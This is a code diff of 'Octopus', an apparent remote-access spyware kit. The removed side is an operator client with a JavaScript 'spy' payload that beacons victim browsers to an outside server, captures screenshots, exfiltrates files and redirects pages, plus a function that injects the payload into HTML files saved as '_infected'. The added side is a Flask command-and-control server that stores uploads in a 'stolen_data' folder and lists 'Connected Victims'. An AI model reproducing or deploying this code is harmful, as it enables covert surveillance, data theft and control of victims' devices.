@@ -1,236 +1,448 @@
-import tkinter as tk
-from tkinter import filedialog, messagebox, ttk, scrolledtext, simpledialog
-import requests
-import threading
-import time
-import json
-import base64
 import os
-import webbrowser
-from datetime import datetime
-from PIL import Image, ImageTk
+import json
+import sqlite3
+import base64
+import time
+import threading
+import logging
+import uuid
+from datetime import datetime, timedelta
+from flask import Flask, request, jsonify, send_file, render_template_string
+from flask_cors import CORS
+from flask_socketio import SocketIO, emit
+from cryptography.fernet import Fernet
 import io
 
-# ================= إعدادات الاتصال =================
-SERVER_URL = "https://web-production-5330.up.railway.app"  # ضع رابط سيرفرك هنا
+# ==========================================
+# Advanced System Settings
+# ==========================================
+APP_NAME = "Octopus Ultimate Control v8.0"
+VERSION = "8.0.0"
 
-# ================= كود الحقن (الجاسوس) =================
-JS_PAYLOAD = f'''
-(function() {{
-    const SERVER = "{SERVER_URL}";
+# Directories & Files
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = os.path.join(BASE_DIR, "octopus_core.db")
+LOGS_DIR = os.path.join(BASE_DIR, "system_logs")
+UPLOADS_DIR = os.path.join(BASE_DIR, "stolen_data")
+APK_DIR = os.path.join(BASE_DIR, "payloads")
+
+# Ensure directories exist
+for directory in [LOGS_DIR, UPLOADS_DIR, APK_DIR]:
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+# Encryption Setup
+ENCRYPTION_KEY = Fernet.generate_key()
+cipher = Fernet(ENCRYPTION_KEY)
+
+# Flask Server Config
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB Upload Limit
+CORS(app, resources={r"/*": {"origins": "*"}})
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+
+# Logging Configuration
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[
+        logging.FileHandler(os.path.join(LOGS_DIR, "server.log")),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# ==========================================
+# Database Management (SQLite)
+# ==========================================
+class DatabaseManager:
+    def __init__(self, db_path):
+        self.db_path = db_path
+        self.init_db()
+
+    def get_connection(self):
+        return sqlite3.connect(self.db_path)
+
+    def init_db(self):
+        """Initialize database schema"""
+        conn = self.get_connection()
+        cursor = conn.cursor()
+
+        # Devices Table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS devices (
+                id TEXT PRIMARY KEY,
+                persistent_id TEXT UNIQUE,
+                model TEXT,
+                android_version TEXT,
+                ip_address TEXT,
+                mac_address TEXT,
+                battery_level INTEGER,
+                is_rooted INTEGER DEFAULT 0,
+                network_type TEXT,
+                location_lat REAL,
+                location_lon REAL,
+                last_seen TIMESTAMP,
+                status TEXT DEFAULT 'offline',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+
+        # Commands Table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT,
+                type TEXT,
+                payload TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                executed_at TIMESTAMP,
+                FOREIGN KEY (device_id) REFERENCES devices (id)
+            )
+        ''')
+
+        # Files Table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS files (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT,
+                filename TEXT,
+                file_type TEXT,
+                file_size INTEGER,
+                file_path TEXT,
+                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (device_id) REFERENCES devices (id)
+            )
+        ''')
+
+        # Logs Table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS activity_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT,
+                event_type TEXT,
+                details TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+
+        conn.commit()
+        conn.close()
+        logger.info("Database initialized successfully.")
+
+    # --- Device Operations ---
+    def register_device(self, data, ip):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        now = datetime.now().isoformat()
+        
+        device_id = data.get('device_id')
+        if not device_id: return None
+
+        try:
+            cursor.execute('''
+                INSERT INTO devices (id, persistent_id, model, android_version, ip_address, 
+                                   battery_level, network_type, last_seen, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'online')
+                ON CONFLICT(id) DO UPDATE SET
+                    model=excluded.model,
+                    ip_address=excluded.ip_address,
+                    battery_level=excluded.battery_level,
+                    last_seen=excluded.last_seen,
+                    status='online'
+            ''', (
+                device_id,
+                data.get('persistent_id', device_id),
+                data.get('model', 'Unknown'),
+                data.get('version', 'Unknown'),
+                ip,
+                data.get('battery', 0),
+                data.get('network', 'Unknown'),
+                now
+            ))
+            conn.commit()
+            return True
+        except Exception as e:
+            logger.error(f"Error registering device: {e}")
+            return False
+        finally:
+            conn.close()
+
+    def update_heartbeat(self, device_id):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute("UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?", 
+                          (datetime.now().isoformat(), device_id))
+            conn.commit()
+        except Exception as e:
+            logger.error(f"Heartbeat error: {e}")
+        finally:
+            conn.close()
+
+    def get_all_devices(self):
+        conn = self.get_connection()
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
+        devices = [dict(row) for row in cursor.fetchall()]
+        conn.close()
+        return devices
+
+    # --- Command Operations ---
+    def add_command(self, device_id, cmd_type, payload):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute("INSERT INTO commands (device_id, type, payload) VALUES (?, ?, ?)",
+                          (device_id, cmd_type, json.dumps(payload)))
+            conn.commit()
+            return cursor.lastrowid
+        finally:
+            conn.close()
+
+    def get_pending_commands(self, device_id):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT id, type, payload FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,))
+            cmds = []
+            for row in cursor.fetchall():
+                cmds.append({
+                    "id": row[0],
+                    "type": row[1],
+                    "data": json.loads(row[2]) if row[2] else {}
+                })
+                # Mark as sent (simplistic queue logic)
+                cursor.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row[0],))
+            conn.commit()
+            return cmds
+        finally:
+            conn.close()
+
+    # --- File Operations ---
+    def save_file_record(self, device_id, filename, file_type, size, path):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO files (device_id, filename, file_type, file_size, file_path) VALUES (?, ?, ?, ?, ?)",
+                      (device_id, filename, file_type, size, path))
+        conn.commit()
+        conn.close()
+
+    def get_device_files(self, device_id):
+        conn = self.get_connection()
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM files WHERE device_id = ? ORDER BY uploaded_at DESC", (device_id,))
+        files = [dict(row) for row in cursor.fetchall()]
+        conn.close()
+        return files
+
+db = DatabaseManager(DB_PATH)
+
+# ==========================================
+# Background Services
+# ==========================================
+def cleanup_service():
+    """Mark inactive devices as offline"""
+    while True:
+        try:
+            conn = db.get_connection()
+            cursor = conn.cursor()
+            cutoff = datetime.now() - timedelta(minutes=5)
+            cursor.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (cutoff.isoformat(),))
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logger.error(f"Cleanup error: {e}")
+        time.sleep(60)
+
+threading.Thread(target=cleanup_service, daemon=True).start()
+
+# ==========================================
+# API Endpoints
+# ==========================================
+
+@app.route('/api/connect', methods=['POST'])
+def api_connect():
+    """Initial device connection"""
+    data = request.json
+    ip = request.remote_addr
+    if db.register_device(data, ip):
+        socketio.emit('device_connected', {'id': data.get('device_id'), 'model': data.get('model')})
+        return jsonify({"status": "success", "message": "Connected"})
+    return jsonify({"status": "error"}), 500
+
+@app.route('/api/heartbeat', methods=['POST'])
+def api_heartbeat():
+    """Heartbeat & Command Polling"""
+    data = request.json
+    device_id = data.get('device_id')
+    if device_id:
+        db.update_heartbeat(device_id)
+        # Check for pending commands
+        cmds = db.get_pending_commands(device_id)
+        return jsonify({"status": "ok", "commands": cmds})
+    return jsonify({"status": "error"}), 400
+
+@app.route('/api/upload', methods=['POST'])
+def api_upload():
+    """Handle file uploads (including screenshots)"""
+    try:
+        device_id = request.form.get('device_id')
+        file_type = request.form.get('type', 'file')
+        
+        if 'file' in request.files:
+            file = request.files['file']
+            filename = f"{device_id}_{int(time.time())}_{file.filename}"
+            path = os.path.join(UPLOADS_DIR, filename)
+            file.save(path)
+            
+            db.save_file_record(device_id, file.filename, file_type, os.path.getsize(path), path)
+            socketio.emit('new_file', {'device_id': device_id, 'filename': filename})
+            return jsonify({"status": "success"})
+            
+        elif 'data' in request.json: # Base64 Image
+            data = request.json['data']
+            if "," in data: data = data.split(",")[1]
+            img_data = base64.b64decode(data)
+            filename = f"screenshot_{device_id}_{int(time.time())}.jpg"
+            path = os.path.join(UPLOADS_DIR, filename)
+            with open(path, "wb") as f:
+                f.write(img_data)
+            
+            db.save_file_record(device_id, filename, "screenshot", len(img_data), path)
+            socketio.emit('new_screenshot', {'device_id': device_id, 'url': f'/uploads/{filename}'})
+            return jsonify({"status": "success"})
+
+    except Exception as e:
+        logger.error(f"Upload error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/api/command', methods=['POST'])
+def api_send_command():
+    """Send command to device"""
+    data = request.json
+    device_id = data.get('device_id')
+    cmd_type = data.get('type')
+    payload = data.get('payload', {})
     
-    // 1. تثبيت الهوية
-    let DEV_ID = localStorage.getItem("_oct_uid");
-    if (!DEV_ID) {{
-        DEV_ID = "MOB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
-        localStorage.setItem("_oct_uid", DEV_ID);
-    }}
+    if db.add_command(device_id, cmd_type, payload):
+        return jsonify({"status": "queued"})
+    return jsonify({"status": "error"}), 500
 
-    // 2. دالة الاتصال الرئيسية
-    async function octopusPing(evt, extra={{}}) {{
-        const data = {{
-            device_id: DEV_ID,
-            event: evt,
-            model: navigator.userAgent,
-            timestamp: Date.now(),
-            ...extra
-        }};
+@app.route('/api/students', methods=['GET'])
+def api_get_students():
+    """Get all devices for client app"""
+    devices = db.get_all_devices()
+    return jsonify([dict(d) for d in devices])
 
-        try {{
-            await fetch(SERVER + "/api/heartbeat", {{
-                method: "POST",
-                headers: {{"Content-Type": "application/json"}},
-                body: JSON.stringify(data),
-                keepalive: true
-            }});
-        }} catch(e) {{}}
-    }}
+# ==========================================
+# Web UI (Control Panel)
+# ==========================================
 
-    // 3. التسجيل الأولي
-    async function register() {{
-        await fetch(SERVER + "/api/connect", {{
-            method: "POST",
-            headers: {{"Content-Type": "application/json"}},
-            body: JSON.stringify({{
-                device_id: DEV_ID,
-                model: navigator.platform,
-                screen: screen.width + "x" + screen.height
-            }})
-        }});
-    }}
+@app.route('/control')
+def control_panel():
+    devices = db.get_all_devices()
+    
+    total = len(devices)
+    online = len([d for d in devices if d['status'] == 'online'])
+    
+    device_rows = ""
+    for d in devices:
+        status_color = "success" if d['status'] == 'online' else "danger"
+        last_seen = datetime.fromisoformat(d['last_seen']).strftime('%H:%M:%S') if d['last_seen'] else "N/A"
+        
+        device_rows += f"""
+        <tr id="row-{d['id']}" class="align-middle">
+            <td><span class="badge bg-dark font-monospace">{d['id'][:8]}...</span></td>
+            <td>{d['model']}</td>
+            <td>Android {d['android_version']}</td>
+            <td><span class="badge bg-{status_color}">{d['status'].upper()}</span></td>
+            <td>{d['battery_level']}%</td>
+            <td>{last_seen}</td>
+            <td>
+                <div class="btn-group btn-group-sm">
+                    <button class="btn btn-outline-info" onclick="selectDevice('{d['id']}')">Manage</button>
+                    <button class="btn btn-outline-warning" onclick="quickCommand('{d['id']}', 'alert')">Alert</button>
+                    <button class="btn btn-outline-danger" onclick="quickCommand('{d['id']}', 'lock')">Lock</button>
+                </div>
+            </td>
+        </tr>
+        """
 
-    // 4. معالج الأوامر
-    async function checkCmds() {{
-        try {{
-            const r = await fetch(SERVER + "/api/heartbeat", {{
-                method: "POST",
-                headers: {{"Content-Type": "application/json"}},
-                body: JSON.stringify({{device_id: DEV_ID}})
-            }});
-            const data = await r.json();
-            
-            if(data.commands) {{
-                data.commands.forEach(c => {{
-                    console.log("Executing:", c.type);
-                    if(c.type === "alert") alert(c.data.message);
-                    if(c.type === "reload") location.reload();
-                    if(c.type === "redirect") window.location.href = c.data.url;
-                    if(c.type === "screenshot") takeShot();
-                    
-                    // --- ميزة طلب الملف ---
-                    if(c.type === "request_file") {{
-                        let input = document.createElement("input");
-                        input.type = "file";
-                        input.onchange = e => {{
-                            let file = e.target.files[0];
-                            let formData = new FormData();
-                            formData.append("file", file);
-                            formData.append("device_id", DEV_ID);
-                            fetch(SERVER + "/api/upload", {{method: "POST", body: formData}});
-                        }};
-                        input.click();
-                    }}
-                }});
+    html = f"""
+    <!DOCTYPE html>
+    <html lang="en" data-bs-theme="dark">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Octopus Ultimate v8</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+        <style>
+            body {{ background-color: #0f172a; font-family: 'Segoe UI', system-ui; }}
+            .sidebar {{ height: 100vh; background: #1e293b; border-right: 1px solid #334155; }}
+            .main-content {{ height: 100vh; overflow-y: auto; }}
+            .card {{ background: #1e293b; border: 1px solid #334155; }}
+            .table {{ --bs-table-bg: transparent; }}
+        </style>
+    </head>
+    <body>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-2 sidebar p-3">
+                    <h3 class="text-success mb-4"><i class="fas fa-spider"></i> OCTOPUS</h3>
+                    <div class="d-grid gap-2">
+                        <button class="btn btn-primary" onclick="location.reload()"><i class="fas fa-sync"></i> Refresh</button>
+                    </div>
+                </div>
+                <div class="col-md-10 main-content p-4">
+                    <div class="row mb-4">
+                        <div class="col-md-3"><div class="card"><div class="card-body text-center"><h3>{total}</h3><small>Total Devices</small></div></div></div>
+                        <div class="col-md-3"><div class="card"><div class="card-body text-center"><h3 class="text-success">{online}</h3><small>Online Now</small></div></div></div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">Connected Victims</div>
+                        <div class="table-responsive">
+                            <table class="table table-hover">
+                                <thead><tr><th>ID</th><th>Model</th><th>OS</th><th>Status</th><th>Battery</th><th>Last Seen</th><th>Actions</th></tr></thead>
+                                <tbody>{device_rows}</tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            function quickCommand(id, type) {{
+                let payload = {{}};
+                if(type === 'alert') {{
+                    const msg = prompt("Enter message:");
+                    if(!msg) return;
+                    payload = {{message: msg}};
+                }}
+                fetch('/api/command', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{device_id: id, type: type, payload: payload}})
+                }}).then(r => r.json()).then(d => alert(d.status));
             }}
-        }} catch(e) {{}}
-    }}
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(html)
 
-    // 5. لقطة الشاشة
-    function takeShot() {{
-        if(typeof html2canvas === 'undefined') {{
-            let s = document.createElement("script");
-            s.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
-            s.onload = () => doShot();
-            document.head.appendChild(s);
-        }} else {{ doShot(); }}
-    }}
+@app.route('/uploads/<path:filename>')
+def download_file(filename):
+    return send_file(os.path.join(UPLOADS_DIR, filename))
 
-    function doShot() {{
-        html2canvas(document.body).then(canvas => {{
-            const img = canvas.toDataURL("image/jpeg", 0.5);
-            fetch(SERVER + "/api/upload", {{
-                method: "POST",
-                headers: {{"Content-Type": "application/json"}},
-                body: JSON.stringify({{data: img, device_id: DEV_ID}})
-            }});
-        }});
-    }}
-
-    register();
-    setInterval(checkCmds, 3000);
-
-}})();
-'''
-
-class OctopusClient:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("🐙 Octopus Control Client")
-        self.root.geometry("1200x800")
-        self.root.configure(bg="#1a1a1a")
-        
-        self.selected_device = None
-        self.setup_ui()
-        self.start_monitoring()
-        self.root.mainloop()
-
-    def setup_ui(self):
-        # Header
-        tk.Label(self.root, text="OCTOPUS CONTROL CLIENT", font=("Impact", 24), bg="#1a1a1a", fg="#00ff00").pack(pady=10)
-        
-        # Main Split
-        paned = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg="#1a1a1a")
-        paned.pack(fill="both", expand=True, padx=10, pady=10)
-
-        # Device List
-        frame_list = tk.LabelFrame(paned, text="Devices", bg="#1a1a1a", fg="white")
-        paned.add(frame_list, width=400)
-        
-        cols = ("ID", "Model", "Status")
-        self.tree = ttk.Treeview(frame_list, columns=cols, show="headings")
-        for c in cols: self.tree.heading(c, text=c)
-        self.tree.pack(fill="both", expand=True)
-        self.tree.bind("<<TreeviewSelect>>", self.on_select)
-
-        # Controls
-        frame_ctrl = tk.Frame(paned, bg="#1a1a1a")
-        paned.add(frame_ctrl)
-        
-        tk.Label(frame_ctrl, text="Commands", bg="#1a1a1a", fg="white", font=("Arial", 12)).pack(pady=5)
-        
-        btns = [
-            ("📸 Screenshot", "screenshot", "blue"),
-            ("📂 Request File", "request_file", "purple"),
-            ("📢 Alert", "alert", "orange"),
-            ("🌐 Redirect", "redirect", "green"),
-            ("☠️ Malicious APK", "install_apk", "red")
-        ]
-        
-        for txt, cmd, clr in btns:
-            tk.Button(frame_ctrl, text=txt, bg=clr, fg="white", font=("Arial", 10, "bold"), width=20,
-                      command=lambda c=cmd: self.send_cmd(c)).pack(pady=5)
-
-        tk.Button(frame_ctrl, text="💉 Inject File", bg="#333", fg="white", command=self.inject).pack(pady=20)
-
-        # Log
-        self.log_box = scrolledtext.ScrolledText(frame_ctrl, height=10, bg="black", fg="#00ff00")
-        self.log_box.pack(fill="x", pady=10)
-
-    def log(self, msg):
-        self.log_box.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
-        self.log_box.see(tk.END)
-
-    def start_monitoring(self):
-        def loop():
-            while True:
-                try:
-                    # هذه الدالة تتطلب نقطة نهاية API خاصة في السيرفر لجلب الأجهزة بصيغة JSON
-                    # في الكود أعلاه، الصفحة /control تعرض HTML، لكن يمكنك إضافة endpoint JSON
-                    pass 
-                except: pass
-                time.sleep(5)
-        threading.Thread(target=loop, daemon=True).start()
-
-    def on_select(self, event):
-        sel = self.tree.selection()
-        if sel:
-            self.selected_device = self.tree.item(sel[0], "values")[0]
-            self.log(f"Selected: {self.selected_device}")
-
-    def send_cmd(self, cmd_type):
-        if not self.selected_device:
-            messagebox.showwarning("Error", "Select a device!")
-            return
-        
-        payload = {}
-        if cmd_type == "alert":
-            msg = simpledialog.askstring("Input", "Message:")
-            if not msg: return
-            payload = {"message": msg}
-        elif cmd_type == "redirect":
-            url = simpledialog.askstring("Input", "URL:")
-            if not url: return
-            payload = {"url": url}
-            
-        data = {
-            "device_id": self.selected_device,
-            "type": cmd_type,
-            "payload": payload
-        }
-        
-        threading.Thread(target=lambda: requests.post(f"{SERVER_URL}/api/command", json=data)).start()
-        self.log(f"Sent {cmd_type}")
-
-    def inject(self):
-        path = filedialog.askopenfilename(filetypes=[("HTML", "*.html")])
-        if path:
-            with open(path, 'r', encoding='utf-8') as f: content = f.read()
-            inj = f"<script>{JS_PAYLOAD}</script>"
-            new_c = content.replace("</body>", f"{inj}</body>") if "</body>" in content else content + inj
-            
-            save_path = path.replace(".html", "_infected.html")
-            with open(save_path, 'w', encoding='utf-8') as f: f.write(new_c)
-            messagebox.showinfo("Success", f"File saved: {save_path}")
-
-if __name__ == "__main__":
-    OctopusClient()
+# ==========================================
+# Run Server
+# ==========================================
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
